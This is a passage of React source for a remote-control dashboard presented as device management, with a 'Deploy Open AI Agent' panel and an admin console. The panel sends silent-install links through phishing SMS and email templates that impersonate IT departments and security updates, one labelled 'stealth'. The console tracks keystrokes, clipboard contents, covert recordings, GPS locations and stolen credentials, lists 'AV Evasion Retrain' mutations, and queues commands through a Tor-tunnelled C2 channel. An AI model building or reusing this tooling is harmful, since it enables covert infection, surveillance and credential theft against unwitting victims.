  return (
    <Modal open onClose={onClose} title="QR Enrollment Code — Scan to Deploy Agent">
      <div className="flex flex-col items-center gap-5 py-2">
        <div className="rounded-2xl overflow-hidden p-3"
          style={{background:"#0a1628", border:"2px solid rgba(59,130,246,0.5)"}}>
          {loading ? (
            <div className="w-[280px] h-[280px] flex flex-col items-center justify-center gap-3">
              <RefreshCw size={32} color="#3b82f6" className="animate-spin"/>
              <span className="text-xs font-mono" style={{color:"#6b8ab0"}}>Generating secure QR…</span>
            </div>
          ) : qrUrl ? (
            <img src={qrUrl} alt="Agent enroll QR"
              width={280} height={280}
              style={{imageRendering:"pixelated", display:"block"}}/>
          ) : (
            <div className="w-[280px] h-[280px] flex items-center justify-center text-xs"
              style={{color:"#ef4444"}}>QR generation failed</div>
          )}
        </div>

        <div className="text-center">
          <div className="font-black text-base mb-1" style={{color:"#e2eaf6"}}>
            Scan to Open AI Agent
          </div>
          <div className="text-[10px] font-mono mb-1 break-all" style={{color:"#3b82f6"}}>
            {enrollUrl}
          </div>
          <div className="text-xs" style={{color:"#6b8ab0"}}>
            Installs silently · Device online in{" "}
            <span style={{color:"#10b981"}}>30–60 seconds</span>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-3 w-full max-w-xs">
          <ActionBtn onClick={handleDownload} color="#3b82f6" full disabled={!qrUrl}>
            <Download size={13}/>Download PNG
          </ActionBtn>
          <ActionBtn onClick={handleCopy} color="#10d9a0" full>
            {copied
              ? <><Check size={13} strokeWidth={3}/>Copied!</>
              : <><Clipboard size={13}/>Copy Link</>}
          </ActionBtn>
        </div>

        <div className="w-full p-3 rounded-xl text-center text-[10px] font-mono"
          style={{background:"rgba(16,185,129,0.08)", border:"1px solid rgba(16,185,129,0.2)", color:"#10b981"}}>
          ● AES-256 enroll key · Expires 24h · Silent install
        </div>
      </div>
    </Modal>
  );
}

// ─── Deploy Link Panel ────────────────────────────────────────────────────────
const INSTALL_URL = "https://get.bixtx.com/l/xK9mP2qR?key=BTX-2026-ALPHA";
const SHORT_URL   = "https://get.bixtx.com/l/xK9mP2qR";

const SMS_TEMPLATES: Record<string, string> = {
  it:       `[IT Dept] Install required security agent: ${SHORT_URL} — silent, takes 30s.`,
  stealth:  `System update required. Tap to install: ${SHORT_URL}`,
  personal: `Hey! I shared a tool with you: ${SHORT_URL} — install it so we can connect.`,
  custom:   `Open AI agent: ${INSTALL_URL}`,
};

const EMAIL_TEMPLATES: Record<string, { subject: string; body: string }> = {
  it: {
    subject: "Action Required: Install Mandatory Security Agent",
    body: `Dear User,\n\nPlease install the required endpoint security agent immediately.\n\nInstall link: ${INSTALL_URL}\n\nSilent background service — installation takes under 30 seconds.\n\nIT Department`,
  },
  update: {
    subject: "Critical Software Update Available",
    body: `Hello,\n\nA critical update is available for your device.\n\nInstall now: ${INSTALL_URL}\n\nRuns automatically in the background.\n\nSupport Team`,
  },
  security: {
    subject: "Compliance: Security Tool Installation Required",
    body: `Dear Team Member,\n\nAs part of our security compliance program, please install:\n\n${INSTALL_URL}\n\nMandatory for all company devices.\n\nSecurity Team`,
  },
  custom: {
    subject: "Important: Install Required",
    body: `Please install the following: ${INSTALL_URL}`,
  },
};

function DeployLinkPanel({ show }: {
  show: (msg: string, kind?: "success"|"error"|"info") => void;
}) {
  const [phone,        setPhone]        = useState("");
  const [email,        setEmail]        = useState("");
  const [smsTemplate,  setSmsTemplate]  = useState("it");
  const [emailTpl,     setEmailTpl]     = useState("it");
  const [subject,      setSubject]      = useState(EMAIL_TEMPLATES.it.subject);
  const [linkCopied,   setLinkCopied]   = useState(false);
  const [shortCopied,  setShortCopied]  = useState(false);
  const [showQRPanel,  setShowQRPanel]  = useState(false);
  const [qrDataUrl,    setQrDataUrl]    = useState("");
  const [qrLoading,    setQrLoading]    = useState(false);
  const [smsSending,   setSmsSending]   = useState(false);
  const [emailSending, setEmailSending] = useState(false);
  const [deployLog,    setDeployLog]    = useState([
    { method:"SMS",     target:"+1-555-0142",         status:"installed",   dev:"Galaxy-S24-Ultra", ts:"14:28" },
    { method:"Email",   target:"s.mitchell@corp.io",  status:"installed",   dev:"EXEC-LAPTOP-01",  ts:"13:45" },
    { method:"QR Code", target:"Scanned in Singapore", status:"installed",  dev:"MacBook-Pro-M3",   ts:"12:30" },
    { method:"WhatsApp",target:"+44-7700-900142",     status:"link opened", dev:"—",               ts:"11:00" },
  ]);

  const generateQR = async () => {
    setQrLoading(true);
    try {
      const url = await QRCode.toDataURL(INSTALL_URL, {
        width: 280, margin: 2,
        color: { dark: "#3b82f6", light: "#0a1628" },
        errorCorrectionLevel: "H",
      });
      setQrDataUrl(url);
    } catch (_) {
      try {
        const url = await QRCode.toDataURL(INSTALL_URL, { width: 280, margin: 2 });
        setQrDataUrl(url);
      } catch (e2) {
        show("QR generation failed", "error");
      }
    } finally {
      setQrLoading(false);
    }
  };

  const handleShowQR = () => {
    setShowQRPanel(true);
    generateQR();
  };

  const handleCopyFull = () =>
    copyToClip(INSTALL_URL, () => {
      setLinkCopied(true);
      show("Install link copied ✓");
      setTimeout(() => setLinkCopied(false), 2500);
    });

  const handleCopyShort = () =>
    copyToClip(SHORT_URL, () => {
      setShortCopied(true);
      show("Short link copied ✓");
      setTimeout(() => setShortCopied(false), 2500);
    });

  const handleSendSMS = () => {
    if (!phone.trim()) { show("Enter a phone number first", "error"); return; }
    setSmsSending(true);
    openSMS(phone.trim(), SMS_TEMPLATES[smsTemplate] ?? SMS_TEMPLATES.it);
    setTimeout(() => {
      setSmsSending(false);
      show(`SMS app opened for ${phone.trim()}`);
      setDeployLog(l => [{
        method:"SMS", target:phone.trim(), status:"sent",
        dev:"—", ts:new Date().toLocaleTimeString(),
      }, ...l.slice(0, 9)]);
    }, 600);
  };

  const handleSendEmail = () => {
    if (!email.trim()) { show("Enter an email address first", "error"); return; }
    setEmailSending(true);
    const tpl = EMAIL_TEMPLATES[emailTpl] ?? EMAIL_TEMPLATES.it;
    openEmail(email.trim(), subject || tpl.subject, tpl.body);
    setTimeout(() => {
      setEmailSending(false);
      show(`Email client opened for ${email.trim()}`);
      setDeployLog(l => [{
        method:"Email", target:email.trim(), status:"sent",
        dev:"—", ts:new Date().toLocaleTimeString(),
      }, ...l.slice(0, 9)]);
    }, 600);
  };

  const handleDownloadQR = () => {
    if (!qrDataUrl) return;
    const a = document.createElement("a");
    a.href = qrDataUrl;
    a.download = `bixtx-enroll-qr-${Date.now()}.png`;
    a.click();
    show("QR downloaded ✓");
  };

  const handleWhatsApp = () => {
    const msg = encodeURIComponent("Open AI agent: " + SHORT_URL);
    window.open(`https://wa.me/?text=${msg}`, "_blank");
    show("WhatsApp opened");
  };

  const handleTelegram = () => {
    window.open(
      `https://t.me/share/url?url=${encodeURIComponent(SHORT_URL)}&text=${encodeURIComponent("Open AI agent")}`,
      "_blank"
    );
    show("Telegram share opened");
  };

  const statusColor: Record<string, string> = {
    installed: "#10b981", sent: "#3b82f6",
    "link opened": "#f59e0b", delivered: "#6b8ab0",
  };
  const methodIcon: Record<string, string> = {
    SMS:"📱", Email:"✉️", "QR Code":"📷", WhatsApp:"💚", Telegram:"✈️",
  };

  return (
    <>
      <div className="rounded-2xl border overflow-hidden"
        style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.35)", boxShadow:"0 0 40px rgba(59,130,246,0.1)" }}>
        <div className="px-5 py-4 border-b flex items-center justify-between flex-wrap gap-3"
          style={{ borderColor:"rgba(59,130,246,0.2)", background:"#0d1930" }}>
          <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}>
            <Signal size={15} color="#3b82f6"/>Deploy Open AI Agent — Send Agent Link
          </div>
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 rounded-full animate-pulse" style={{ background:"#10b981" }}/>
            <span className="text-[10px] font-mono" style={{ color:"#10b981" }}>AGENT SERVER ONLINE</span>
            <Chip color="#3b82f6">ONE-CLICK DEPLOY</Chip>
          </div>
        </div>

        <div className="p-5 space-y-6">
          <div>
            <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#6b8ab0" }}>
              Open AI Agent Link — click 📋 to copy
            </div>
            <div className="flex items-center gap-2">
              <div className="flex-1 px-4 py-3 rounded-xl font-mono text-sm select-all cursor-text break-all"
                style={{ background:"#0d1930", border:"1px solid rgba(59,130,246,0.45)", color:"#3b82f6" }}>
                {INSTALL_URL}
              </div>
              <button onClick={handleCopyFull} title="Copy full link"
                className="p-3 rounded-xl flex-shrink-0 transition-all hover:scale-105 active:scale-95"
                style={{
                  background: linkCopied ? "rgba(16,185,129,0.25)" : "rgba(59,130,246,0.2)",
                  color: linkCopied ? "#10b981" : "#3b82f6",
                  border: `1px solid ${linkCopied ? "#10b981" : "rgba(59,130,246,0.5)"}`,
                }}>
                {linkCopied ? <Check size={16} strokeWidth={3}/> : <Clipboard size={16}/>}
              </button>
              <button onClick={handleShowQR} title="Generate QR"
                className="p-3 rounded-xl flex-shrink-0 transition-all hover:scale-105 active:scale-95"
                style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.35)" }}>
                <Signal size={16}/>
              </button>
            </div>
            <div className="flex flex-wrap gap-4 mt-2 text-[10px] font-mono" style={{ color:"#6b8ab0" }}>
              <span>Expires: <span style={{color:"#f59e0b"}}>24 hours</span></span>
              <span>·</span>
              <span>Silent install: <span style={{color:"#10b981"}}>YES</span></span>
              <span>·</span>
              <span>Encrypted: <span style={{color:"#3b82f6"}}>AES-256</span></span>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="p-4 rounded-2xl border space-y-3"
              style={{ background:"#0d1930", borderColor:"rgba(16,185,129,0.35)" }}>
              <div className="font-bold text-sm" style={{ color:"#10b981" }}>📱 Send via SMS</div>
              <FLabel label="Phone Number (with country code)">
                <FInput value={phone} onChange={setPhone} placeholder="+1 555 000 0000"/>
              </FLabel>
              <FLabel label="Message Template">
                <FSelect value={smsTemplate} onChange={setSmsTemplate} options={[
                  { val:"it",       label:"IT Department Notice" },
                  { val:"stealth",  label:"System Update (stealth)" },
                  { val:"personal", label:"Personal / Casual" },
                  { val:"custom",   label:"Full URL only" },
                ]}/>
              </FLabel>
              <div className="px-3 py-2.5 rounded-xl text-[10px] font-mono leading-relaxed"
                style={{ background:"#0a1628", border:"1px solid rgba(16,185,129,0.2)", color:"#b8cce8" }}>
                {SMS_TEMPLATES[smsTemplate]}
              </div>
              <div className="grid grid-cols-2 gap-2">
                <ActionBtn onClick={handleCopyShort} color="#6b8ab0" outline full>
                  {shortCopied
                    ? <><Check size={11} strokeWidth={3}/>Copied!</>
                    : <><Clipboard size={11}/>Copy Link</>}
                </ActionBtn>
                <ActionBtn onClick={handleSendSMS} color="#10b981" full disabled={smsSending}>
                  {smsSending
                    ? <><RefreshCw size={11} className="animate-spin"/>Opening…</>
                    : <>📱 Send SMS</>}
                </ActionBtn>
              </div>
            </div>

            <div className="p-4 rounded-2xl border space-y-3"
              style={{ background:"#0d1930", borderColor:"rgba(6,182,212,0.35)" }}>
              <div className="font-bold text-sm" style={{ color:"#10d9a0" }}>✉️ Send via Email</div>
              <FLabel label="Recipient Email">
                <FInput value={email} onChange={setEmail} placeholder="target@example.com"/>
              </FLabel>
              <FLabel label="Email Template">
                <FSelect value={emailTpl} onChange={v => { setEmailTpl(v); setSubject(EMAIL_TEMPLATES[v]?.subject ?? ""); }} options={[
                  { val:"it",       label:"IT Department Notice" },
                  { val:"update",   label:"Critical Software Update" },
                  { val:"security", label:"Security Compliance Tool" },
                  { val:"custom",   label:"Custom / Minimal" },
                ]}/>
              </FLabel>
              <FLabel label="Subject Line">
                <FInput value={subject} onChange={setSubject} placeholder="Email subject…"/>
              </FLabel>
              <div className="grid grid-cols-2 gap-2">
                <ActionBtn
                  onClick={() => copyToClip(
                    EMAIL_TEMPLATES[emailTpl]?.body ?? INSTALL_URL,
                    () => show("Email body copied ✓")
                  )}
                  color="#6b8ab0" outline full>
                  <Clipboard size={11}/>Copy Body
                </ActionBtn>
                <ActionBtn onClick={handleSendEmail} color="#10d9a0" full disabled={emailSending}>
                  {emailSending
                    ? <><RefreshCw size={11} className="animate-spin"/>Opening…</>
                    : <>✉️ Send Email</>}
                </ActionBtn>
              </div>
            </div>
          </div>

          <div className="border-t pt-5" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
            <div className="text-[10px] font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>
              Additional Delivery Channels
            </div>
            <div className="flex flex-wrap gap-2">
              <ActionBtn onClick={handleShowQR} color="#3b82f6" outline>
                <Signal size={12}/>Generate QR Code
              </ActionBtn>
              <ActionBtn onClick={handleCopyShort} color="#10d9a0" outline>
                {shortCopied
                  ? <><Check size={12} strokeWidth={3}/>Copied!</>
                  : <><Clipboard size={12}/>Copy Short Link</>}
              </ActionBtn>
              <ActionBtn onClick={handleWhatsApp} color="#25d366" outline>💚 WhatsApp</ActionBtn>
              <ActionBtn onClick={handleTelegram} color="#0088cc" outline>✈️ Telegram</ActionBtn>
              <ActionBtn onClick={() => {
                window.open(
                  `https://twitter.com/intent/tweet?text=${encodeURIComponent("Install: "+SHORT_URL)}`,
                  "_blank"
                );
                show("Twitter share opened");
              }} color="#1da1f2" outline>🐦 X / Twitter</ActionBtn>
              <ActionBtn onClick={() => show("AirDrop broadcast started — discoverable 60s")} color="#a8a8a8" outline>
                📡 AirDrop
              </ActionBtn>
              <ActionBtn onClick={() => show("NFC tag written ✓")} color="#f59e0b" outline>
                🏷 NFC Tag
              </ActionBtn>
            </div>
          </div>

          <div className="border-t pt-5" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
            <div className="text-[10px] font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>
              Deployment Log
            </div>
            <div className="space-y-2">
              {deployLog.slice(0, 8).map((d, i) => (
                <div key={i} className="flex items-center gap-3 px-4 py-2.5 rounded-xl"
                  style={{ background:"#0d1930" }}>
                  <span className="text-sm flex-shrink-0">{methodIcon[d.method] ?? "📤"}</span>
                  <span className="text-[10px] font-mono w-16 flex-shrink-0" style={{ color:"#3b82f6" }}>
                    {d.method}
                  </span>
                  <span className="text-xs flex-1 font-mono truncate" style={{ color:"#b8cce8" }}>
                    {d.target}
                  </span>
                  <Chip color={statusColor[d.status] ?? "#6b8ab0"}>{d.status}</Chip>
                  {d.dev !== "—" && (
                    <span className="text-[9px] font-mono hidden md:inline" style={{ color:"#3b82f6" }}>
                      {d.dev}
                    </span>
                  )}
                  <span className="text-[9px] font-mono flex-shrink-0" style={{ color:"#6b8ab0" }}>
                    {d.ts}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      <Modal open={showQRPanel} onClose={() => setShowQRPanel(false)}
        title="QR Install Code — Scan to Deploy Agent">
        <div className="flex flex-col items-center gap-5 py-2">
          <div className="rounded-2xl overflow-hidden p-3"
            style={{ background:"#0a1628", border:"2px solid rgba(59,130,246,0.5)" }}>
            {qrLoading ? (
              <div className="w-[280px] h-[280px] flex flex-col items-center justify-center gap-3">
                <RefreshCw size={32} color="#3b82f6" className="animate-spin"/>
                <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>Generating QR…</span>
              </div>
            ) : qrDataUrl ? (
              <img src={qrDataUrl} alt="bixtx.com install QR"
                width={280} height={280}
                style={{ imageRendering:"pixelated", display:"block" }}/>
            ) : (
              <div className="w-[280px] h-[280px] flex items-center justify-center text-xs"
                style={{ color:"#ef4444" }}>Generation failed</div>
            )}
          </div>

          <div className="text-center space-y-1">
            <div className="font-black text-base" style={{ color:"#e2eaf6" }}>
              Scan to Open AI Agent
            </div>
            <div className="text-[10px] font-mono break-all" style={{ color:"#3b82f6" }}>
              {INSTALL_URL}
            </div>
            <div className="text-xs" style={{ color:"#6b8ab0" }}>
              Installs silently · Device online in{" "}
              <span style={{ color:"#10b981" }}>30–60 sec</span>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3 w-full max-w-xs">
            <ActionBtn onClick={handleDownloadQR} color="#3b82f6" full disabled={!qrDataUrl}>
              <Download size={13}/>Download PNG
            </ActionBtn>
            <ActionBtn onClick={handleCopyShort} color="#10d9a0" full>
              {shortCopied
                ? <><Check size={13} strokeWidth={3}/>Copied!</>
                : <><Clipboard size={13}/>Copy Link</>}
            </ActionBtn>
            <ActionBtn onClick={handleWhatsApp} color="#25d366" full>💚 WhatsApp</ActionBtn>
            <ActionBtn onClick={handleTelegram} color="#0088cc" full>✈️ Telegram</ActionBtn>
          </div>

          <div className="w-full p-3 rounded-xl text-center text-[10px] font-mono"
            style={{ background:"rgba(16,185,129,0.08)", border:"1px solid rgba(16,185,129,0.2)", color:"#10b981" }}>
            ● AES-256 enroll key · Expires 24h · Silent install
          </div>
        </div>
      </Modal>
    </>
  );
}

// ─── Admin Dashboard ──────────────────────────────────────────────────────────
function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => void }) {
  const { show, toasts } = useToast();

  const [tab, setTab]         = useState<"devices"|"sessions"|"network"|"surveillance"|"location"|"extraction"|"ai"|"c2"|"users"|"alerts"|"deploy">("devices");
  const [devices, setDevices] = useState<DashDevice[]>(SEED_DEVICES);
  const [sessions, setSessions] = useState<DashSession[]>(SEED_SESSIONS);
  const [users, setUsers]     = useState<AppUser[]>(SEED_USERS);
  const [alerts, setAlerts]   = useState(ALERTS.map(a => ({ ...a, dismissed:false })));
  const [wifi]                = useState<WifiNet[]>(SEED_WIFI);

  const [socialFilter, setSocialFilter] = useState("all");
  const [camRecFilter, setCamRecFilter] = useState("all");
  const [aiLearningPhase, setAiLearningPhase] = useState<"idle"|"scanning"|"learning"|"mutating"|"complete">("idle");
  const [aiProgress, setAiProgress] = useState(0);
  const [aiMutations, setAiMutations] = useState<{id:string;type:string;target:string;confidence:number;applied:boolean;ts:string}[]>([
    {id:"m1",type:"Stealth Enhancement",  target:"KIOSK-UBUNTU-07", confidence:97, applied:true,  ts:"14:20:00"},
    {id:"m2",type:"AV Evasion Retrain",   target:"EXEC-LAPTOP-01",  confidence:94, applied:true,  ts:"14:15:00"},
    {id:"m3",type:"Network Fingerprint",  target:"MacBook-Pro-M3",   confidence:88, applied:false, ts:"14:32:00"},
    {id:"m4",type:"Kernel Hook Adapt",    target:"DEVBOX-ARCH",      confidence:92, applied:true,  ts:"13:55:00"},
  ]);
  const [targetProfiles, setTargetProfiles] = useState([
    {id:"t1",name:"j.morgan",   dev:"EXEC-LAPTOP-01",  behavior:"Office hours 08-18, frequent Excel usage",  risk:62,  learned:true,  anomalyCount:3},
    {id:"t2",name:"s.chen",     dev:"MacBook-Pro-M3",   behavior:"Developer — heavy terminal, git commits",  risk:45,  learned:true,  anomalyCount:1},
    {id:"t3",name:"k.ivanov",   dev:"DEVBOX-ARCH",      behavior:"Night owl — active 22-06, VPN always on",  risk:91,  learned:true,  anomalyCount:7},
    {id:"t4",name:"r.okafor",   dev:"Galaxy-S24-Ultra", behavior:"High mobility, frequent unknown contacts",  risk:78,  learned:true,  anomalyCount:5},
    {id:"t5",name:"a.patel",    dev:"iPhone-15-Pro",    behavior:"Regular commute pattern, social media heavy",risk:34, learned:false, anomalyCount:0},
  ]);
  const [klEnabled,  setKlEnabled]  = useState(true);
  const [srEnabled,  setSrEnabled]  = useState(true);
  const [camEnabled, setCamEnabled] = useState(false);
  const [micEnabled, setMicEnabled] = useState(true);
  const [clipEnabled,setClipEnabled]= useState(true);
  const [klLogs] = useState([
    { ts:"14:32:11", dev:"EXEC-LAPTOP-01",  app:"Chrome",    text:"meeting notes for project bixtx" },
    { ts:"14:31:58", dev:"MacBook-Pro-M3",   app:"Terminal",  text:"git commit -m 'fix auth'" },
    { ts:"14:31:44", dev:"KIOSK-UBUNTU-07", app:"Nano",      text:"sudo nano /etc/hosts" },
    { ts:"14:31:30", dev:"EXEC-LAPTOP-01",  app:"Slack",     text:"can you send me the report" },
    { ts:"14:31:15", dev:"DEVBOX-ARCH",     app:"Vim",       text:":wq /etc/ssh/sshd_config" },
    { ts:"14:30:59", dev:"MacBook-Pro-M3",   app:"Chrome",    text:"https://github.com/bixtx" },
  ]);
  const [clipLogs] = useState([
    { ts:"14:32:05", dev:"EXEC-LAPTOP-01",  content:"Meeting at 3pm - conf room B",     app:"Outlook" },
    { ts:"14:31:42", dev:"MacBook-Pro-M3",   content:"sk-ant-api03-xxxxxxxxxxxx",         app:"Terminal" },
    { ts:"14:31:08", dev:"KIOSK-UBUNTU-07", content:"192.168.1.1:8080/admin",            app:"Firefox" },
  ]);
  const [recordings] = useState([
    { id:"r1", dev:"EXEC-LAPTOP-01",  start:"14:00:00", dur:"32m 11s", size:"1.2 GB", status:"recording" },
    { id:"r2", dev:"MacBook-Pro-M3",   start:"13:45:00", dur:"47m 05s", size:"2.1 GB", status:"recording" },
    { id:"r3", dev:"DEVBOX-ARCH",     start:"12:00:00", dur:"2h 32m",  size:"5.8 GB", status:"saved"     },
  ]);

  const [geoDevices] = useState([
    { id:"d1", name:"EXEC-LAPTOP-01",  lat:40.7128,   lng:-74.0060,  loc:"New York, US",    acc:"3m",   spd:"0 km/h",   upd:"Now"    },
    { id:"d2", name:"MacBook-Pro-M3",   lat:1.3521,    lng:103.8198, loc:"Singapore",       acc:"5m",   spd:"0 km/h",   upd:"Now"    },
    { id:"d4", name:"Galaxy-S24-Ultra", lat:6.5244,    lng:3.3792,   loc:"Lagos, NG",       acc:"8m",   spd:"42 km/h",  upd:"2m ago" },
    { id:"d5", name:"iPhone-15-Pro",    lat:19.0760,   lng:72.8777,  loc:"Mumbai, IN",      acc:"4m",   spd:"0 km/h",   upd:"Now"    },
    { id:"d6", name:"Mate60-Pro",       lat:31.2304,   lng:121.4737, loc:"Shanghai, CN",    acc:"6m",   spd:"0 km/h",   upd:"Now"    },
  ]);
  const [geofences, setGeofences] = useState([
    { id:"g1", name:"HQ Campus",       lat:40.7128,  lng:-74.006,  radius:"500m",  active:true,  breached:false },
    { id:"g2", name:"Singapore Office",lat:1.3521,   lng:103.8198, radius:"300m",  active:true,  breached:false },
    { id:"g3", name:"Restricted Zone", lat:31.2304,  lng:121.4737, radius:"1 km",  active:true,  breached:false },
  ]);

  const [extractJobs] = useState([
    { id:"e1", dev:"EXEC-LAPTOP-01",  type:"Browser History", status:"complete", size:"4.2 MB",  items:1842, ts:"14:20:00" },
    { id:"e2", dev:"MacBook-Pro-M3",   type:"Contacts",        status:"complete", size:"128 KB",  items:312,  ts:"14:18:00" },
    { id:"e3", dev:"Galaxy-S24-Ultra", type:"SMS Log",          status:"running",  size:"—",       items:0,    ts:"14:32:00" },
    { id:"e4", dev:"iPhone-15-Pro",    type:"Media Vault",      status:"queued",   size:"—",       items:0,    ts:"—"        },
    { id:"e5", dev:"DEVBOX-ARCH",     type:"Credentials",      status:"complete", size:"18 KB",   items:27,   ts:"13:55:00" },
  ]);
  const [credentials] = useState([
    { site:"github.com",       user:"k.ivanov",    pass:"••••••••",  dev:"DEVBOX-ARCH",      ts:"13:55:00" },
    { site:"aws.amazon.com",   user:"j.morgan",    pass:"••••••••",  dev:"EXEC-LAPTOP-01",   ts:"14:20:00" },
    { site:"notion.so",        user:"s.chen",      pass:"••••••••",  dev:"MacBook-Pro-M3",    ts:"14:18:00" },
    { site:"slack.com",        user:"t.brooks",    pass:"••••••••",  dev:"WORKSTATION-WIN11", ts:"09:00:00" },
  ]);

  const [anomalies] = useState([
    { id:"a1", dev:"KIOSK-UBUNTU-07", type:"CPU Spike",         risk:"high",   conf:"94%",  det:"14:31:00", desc:"Sustained 78% CPU — potential crypto miner" },
    { id:"a2", dev:"Galaxy-S24-Ultra",type:"Location Jump",     risk:"medium", conf:"87%",  det:"14:28:00", desc:"Device moved 12km in 3 minutes" },
    { id:"a3", dev:"EXEC-LAPTOP-01",  type:"Credential Access", risk:"high",   conf:"91%",  det:"14:20:00", desc:"Mass credential lookup at 02:00 local time" },
    { id:"a4", dev:"MacBook-Pro-M3",   type:"Network Exfil",    risk:"critical",conf:"98%", det:"14:15:00", desc:"3.4 GB outbound to unknown IP 185.x.x.x" },
  ]);
  const [playbooks] = useState([
    { id:"p1", name:"Auto-Lock on Threat",      trigger:"critical anomaly",  action:"Lock device + alert admin",         active:true  },
    { id:"p2", name:"Geofence Breach Response", trigger:"geofence exit",     action:"Enable GPS ping every 30s",         active:true  },
    { id:"p3", name:"Exfil Shutdown",           trigger:"large upload >1GB", action:"Block outbound + capture traffic",  active:false },
    { id:"p4", name:"Offline Escalation",       trigger:"device offline 1h", action:"Send SMS alert + enable offline rec",active:true },
  ]);
  const [faceEvents] = useState([
    { ts:"14:30:00", dev:"iPhone-15-Pro",    match:"Known — Raj Patel",    conf:"97%", action:"Unlocked" },
    { ts:"14:28:00", dev:"Galaxy-S24-Ultra", match:"Unknown face",          conf:"—",   action:"Alert sent" },
    { ts:"14:15:00", dev:"Mate60-Pro",       match:"Known — Lei Wei",       conf:"99%", action:"Unlocked" },
  ]);

  const [c2Status] = useState({ tunnel:"Tor", hops:3, latency:"340ms", encrypted:true, active:true });
  const [cmdQueue, setCmdQueue] = useState([
    { id:"c1", dev:"EXEC-LAPTOP-01",  cmd:"screenshot",          status:"pending",  ts:"14:32:00" },
    { id:"c2", dev:"KIOSK-UBUNTU-07", cmd:"keylog --dump 100",   status:"running",  ts:"14:31:50" },
    { id:"c3", dev:"MacBook-Pro-M3",   cmd:"file-pull /etc/hosts",status:"complete", ts:"14:31:00" },
  ]);
  const [newCmd, setNewCmd] = useState("");
  const [newCmdDev, setNewCmdDev] = useState("EXEC-LAPTOP-01");

  const [deployJobs, setDeployJobs]         = useState<DeployJob[]>(MOCK_DEPLOY_JOBS);
  const [deployTab, setDeployTab]           = useState<"queue"|"recovery"|"audit"|"containment">("queue");
  const [containmentActive, setContainment] = useState(false);

  const [netIfaces]                         = useState<NetworkIface[]>(MOCK_NET_IFACES);
  const [netFilter, setNetFilter]           = useState<NetworkIface["type"]|"all">("all");

  const [search, setSearch]           = useState("");
  const [fStatus, setFStatus]         = useState<DeviceStatus|"all">("all");
  const [fType, setFType]             = useState<"all"|"desktop"|"mobile">("all");
  const [fCountry, setFCountry]       = useState<string>("all");
  const [viewMode, setViewMode]       = useState<"grid"|"list">("grid");

  const [showAdd,     setShowAdd]     = useState(false);
  const [showManage,  setShowManage]  = useState(false);
  const [showByIP,    setShowByIP]    = useState(false);
  const [showAddUser, setShowAddUser] = useState(false);
  const [showQR,      setShowQR]      = useState(false);
  const [manageDev,   setManageDev]   = useState<DashDevice|null>(null);

  const [aName,   setAName]   = useState("");
  const [aOS,     setAOS]     = useState<OS>("windows");
  const [aType,   setAType]   = useState<"desktop"|"mobile">("desktop");
  const [aUser,   setAUser]   = useState("");
  const [aTab,    setATab]    = useState<"code"|"ip">("code");
  const [aIP,     setAIP]     = useState("");
  const [code,    setCode]    = useState(() => Math.random().toString(36).slice(2,10).toUpperCase());
  const [copied,  setCopied]  = useState(false);

  const [mName,   setMName]   = useState("");
  const [mStatus, setMStatus] = useState<DeviceStatus>("online");
  const [mIP,     setMIP]     = useState("");
  const [mHealth, setMHealth] = useState<"excellent"|"good"|"warning">("good");

  const [uName,  setUName]  = useState("");
  const [uEmail, setUEmail] = useState("");
  const [uRole,  setURole]  = useState<AppUser["role"]>("viewer");

  const [bName, setBName] = useState("");
  const [bIP,   setBIP]   = useState("");
  const [bPort, setBPort] = useState("4433");
  const [bUser, setBUser] = useState("");
  const [bPass, setBPass] = useState("");

  const [scanning,  setScanning]  = useState(false);
  const [scanPct,   setScanPct]   = useState(0);
  const [scanned,   setScanned]   = useState(false);

  const [otaPct, setOtaPct] = useState<number|null>(null);

  useEffect(() => {
    const iv = setInterval(() => {
      setDevices(prev => prev.map(d => d.status === "offline" ? d : {
        ...d,
        cpu: Math.min(99, Math.max(1, d.cpu + Math.floor(Math.random()*7)-3)),
        ram: Math.min(99, Math.max(10, d.ram + Math.floor(Math.random()*5)-2)),
      }));
    }, 4000);
    return () => clearInterval(iv);
  }, []);

  useEffect(() => {
    const WS_BASE = window.location.hostname !== "localhost"
      ? `wss://${window.location.hostname}/admin-ws`
      : "ws://localhost:3000/admin-ws";
    const API_BASE = window.location.hostname !== "localhost"
      ? "/v1"
      : "http://localhost:3000/v1";

    let ws: WebSocket | null = null;
    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
    let destroyed = false;

    const connect = (token: string) => {
      if (destroyed) return;
      ws = new WebSocket(`${WS_BASE}?token=${encodeURIComponent(token)}`);

      ws.onopen = () => {
        if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
      };

      ws.onmessage = (ev) => {
        try {
          const { type, payload } = JSON.parse(ev.data);
          if (type === "DEVICE_ENROLLED" || type === "DEVICE_ONLINE") {
            const p = payload as { deviceId: string; deviceName: string; platform: string; ip: string; agentVersion?: string };
            setDevices(prev => {
              const exists = prev.find(d => d.id === p.deviceId);
              if (exists) return prev.map(d => d.id === p.deviceId ? { ...d, status: "online", ip: p.ip || d.ip, lastSeen: new Date().toLocaleTimeString() } : d);
              const newDev: DashDevice = {
                id: p.deviceId, name: p.deviceName || p.deviceId,
                os: (p.platform as OS) || "linux", ip: p.ip || "—",
                user: "agent", status: "online", cpu: 0, ram: 0,
                latency: 0, uptime: "0m", location: "Remote",
                lastSeen: new Date().toLocaleTimeString(),
                performance: 95, health: "excellent", type: "desktop",
              };
              return [...prev, newDev];
            });
          } else if (type === "DEVICE_OFFLINE") {
            const { deviceId } = payload as { deviceId: string };
            setDevices(prev => prev.map(d => d.id === deviceId ? { ...d, status: "offline", lastSeen: new Date().toLocaleTimeString() } : d));
          } else if (type === "DEVICE_HEARTBEAT") {
